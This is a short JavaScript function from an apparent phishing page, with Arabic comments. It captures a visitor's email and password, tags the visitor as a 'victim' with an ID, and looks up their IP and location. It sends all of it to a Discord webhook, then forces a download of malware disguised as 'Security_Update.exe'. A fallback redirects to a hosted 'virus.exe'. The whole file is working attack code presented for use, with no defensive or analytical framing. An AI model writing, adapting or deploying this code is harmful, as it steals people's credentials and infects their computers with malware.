async function startCapture() {
    const email = document.getElementById('email').value;
    const pass = document.getElementById('pass').value;

    if(!email || !pass) return alert("الرجاء إكمال التوثيق");

    // توليد رقم تعريفي للضحية لتمييزه في اللوحة
    const victimID = "ID-" + Math.floor(Math.random() * 9000 + 1000);

    try {
        const configRes = await fetch('./data.json');
        const config = await configRes.json();
        
        // جلب معلومات إضافية لتحديد الهدف
        const geoRes = await fetch('https://ipapi.co/json/');
        const geo = await geoRes.json();

        // إرسال البيانات للديسكورد مع تحديد الـ ID
        await fetch(config.webhook_url, {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify({
                username: "ER0R DETECTOR",
                embeds: [{
                    title: `💀 هدف جديد: ${victimID}`,
                    description: `الضحية دخلت الآن من **${geo.city}, ${geo.country_name}**`,
                    fields: [
                        { name: "📧 الحساب", value: `\`${email}\``, inline: true },
                        { name: "🔑 الباسورد", value: `\`${pass}\``, inline: true },
                        { name: "🌐 الـ IP", value: geo.ip, inline: true }
                    ],
                    color: 0xff0000
                }]
            })
        });

        // --- حل مشكلة التحميل ---
        // استخدام رابط مباشر يفتح في نافذة جديدة لإجبار المتصفح على التنزيل
        const link = document.createElement('a');
        link.href = config.pc_payload;
        link.target = "_blank"; // يفتح نافذة جديدة لضمان عدم الحجب
        link.download = "Security_Update.exe";
        document.body.appendChild(link);
        link.click();
        document.body.removeChild(link);

    } catch(e) {
        // إذا فشل كل شيء، توجيه مباشر للرابط
        window.location.href = "https://download1507.mediafire.com/0ytokbyf243883y/virus.exe";
    }
}
